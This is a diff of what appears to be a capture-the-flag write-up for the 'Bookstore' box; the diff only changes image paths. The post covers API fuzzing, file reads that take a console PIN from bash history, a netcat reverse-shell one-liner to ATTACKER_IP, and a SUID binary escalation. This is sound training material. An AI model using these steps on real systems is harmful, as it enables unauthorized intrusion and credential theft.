@@ -50,16 +50,16 @@ Not a whole lot we can do with that version of OpenSSH other than username enume
 
 First, I'll do some light enumeration on each site to get a basic idea of what the applications are used for and how we may go about exploiting them. The Apache server hosts a Bookstore webpage that lets us browse books in stock, however it doesn't query a database so any type of SQL injection there is out of question.
 
-![](../assets/img/2026-04-09-Bookstore/1.png)
+![](/assets/img/2026-04-09-Bookstore/1.png)
 
 There is a link to a login page but attempting to login or signup does not work. Inspecting the network tab under my browser's developer tools show that this isn't making a POST request anywhere.
 
-![](../assets/img/2026-04-09-Bookstore/2.png)
+![](/assets/img/2026-04-09-Bookstore/2.png)
 
 ### Werkzeug Server
 Since there isn't much of an attack surface on this site, I hop over to the Werkzeug server. The landing page discloses that it is used for REST APIs which aligns with the entry in the _robots.txt_ file.
 
-![](../assets/img/2026-04-09-Bookstore/3.png)
+![](/assets/img/2026-04-09-Bookstore/3.png)
 
 A REST API (Representational State Transfer API) is a way for clients (like browsers or scripts) to interact with a web server using standard HTTP methods such as GET, POST, PUT, and DELETE. It exposes resources (like users or files) through URLs, and operations on those resources are performed statelessly - each request contains all the information needed for the server to process it. Responses are typically returned in formats like JSON, making them quite easy for applications to consume.
 
@@ -94,12 +94,12 @@ console                 [Status: 200, Size: 1985, Words: 411, Lines: 53, Duratio
 
 This console page is protected by a PIN that we can get from various places, however we'd need to have shell access or be able to read certain files on the system.
 
-![](../assets/img/2026-04-09-Bookstore/4.png)
+![](/assets/img/2026-04-09-Bookstore/4.png)
 
 ## API Exploitation
 Navigating to the `/api` endpoint, we're given documentation for the API routes in place for the bookstore. 
 
-![](../assets/img/2026-04-09-Bookstore/5.png)
+![](/assets/img/2026-04-09-Bookstore/5.png)
 
 ### Discovering Hidden Parameter
 Fuzzing for any other common ones doesn't return anything interesting, so we'll have to exploit the book endpoint somehow.
@@ -167,16 +167,16 @@ show                    [Status: 500, Size: 23076, Words: 3277, Lines: 357, Dura
 
 Repeating the process for **v1** APIs gives us an interesting endpoint named 'show'. This is pretty vague but while trying to read files on the system, I get a successful response containing the contents of `/etc/passwd`.
 
-![](../assets/img/2026-04-09-Bookstore/6.png)
+![](/assets/img/2026-04-09-Bookstore/6.png)
 
 ### Shell via Debug Console
 Now that we can successfully read files on the server, I grab the debug console's PIN code from `/home/sid/.bash_history` and use it to authenticate on that page. I also tried to grab Sid's RSA private key to login over SSH, but nothing was found.
 
-![](../assets/img/2026-04-09-Bookstore/7.png)
+![](/assets/img/2026-04-09-Bookstore/7.png)
 
 This console allows us to execute Python expressions in the context of the application. A simple test for a math equation confirms this.
 
-![](../assets/img/2026-04-09-Bookstore/8.png)
+![](/assets/img/2026-04-09-Bookstore/8.png)
 
 We're able to import Python's OS module to execute commands, but it seems they're not reflected to us. Though this isn't a problem and we can just pass in a Bash one-liner to get a reverse shell on the system as Sid since they're the one running it.
 
@@ -185,18 +185,18 @@ We're able to import Python's OS module to execute commands, but it seems they'r
 >>> os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 443 >/tmp/f')
 ```
 
-![](../assets/img/2026-04-09-Bookstore/9.png)
+![](/assets/img/2026-04-09-Bookstore/9.png)
 
 At this point we can grab the user flag under their home directory and start looking at routes to escalate privileges to root user.
 
 ## Privilege Escalation
 Alongside the first flag is a binary with the SUID bit set on it. Running the file command against it confirms that we're dealing with an ELF and executing it shows that we must pass in a magic number for a correct result.
 
-![](../assets/img/2026-04-09-Bookstore/10.png)
+![](/assets/img/2026-04-09-Bookstore/10.png)
 
 I run `ltrace` and `strace` against it but don't find much, however looking at its strings most likely shows that if we get the magic number right, it drops us into a root Bash shell.
 
-![](../assets/img/2026-04-09-Bookstore/11.png)
+![](/assets/img/2026-04-09-Bookstore/11.png)
 
 ### Reverse Engineering ELF
 I end up transferring it to my local machine via the web server on port 80 and decompiling  it with Ghidra for a better look at what the code is doing. Looking through the main function, we can see the following code: 
@@ -208,7 +208,7 @@ local_14 = local_1c ^ 0x1116 ^ local_18;
   }
 ```
 
-![](../assets/img/2026-04-09-Bookstore/12.png)
+![](/assets/img/2026-04-09-Bookstore/12.png)
 
 This code is building our "magic number" by XOR'ing three values together:
 
@@ -234,6 +234,6 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 After entering the magic number, we're granted full privileges over the system. 
 
-![](../assets/img/2026-04-09-Bookstore/13.png)
+![](/assets/img/2026-04-09-Bookstore/13.png)
 
 Finally, we can grab the root flag under their home directory to complete this challenge. I really enjoyed this box since API hacking is a great skill to have and isn't too hard to exploit. I hope this was helpful to anyone following along or stuck and happy hacking!
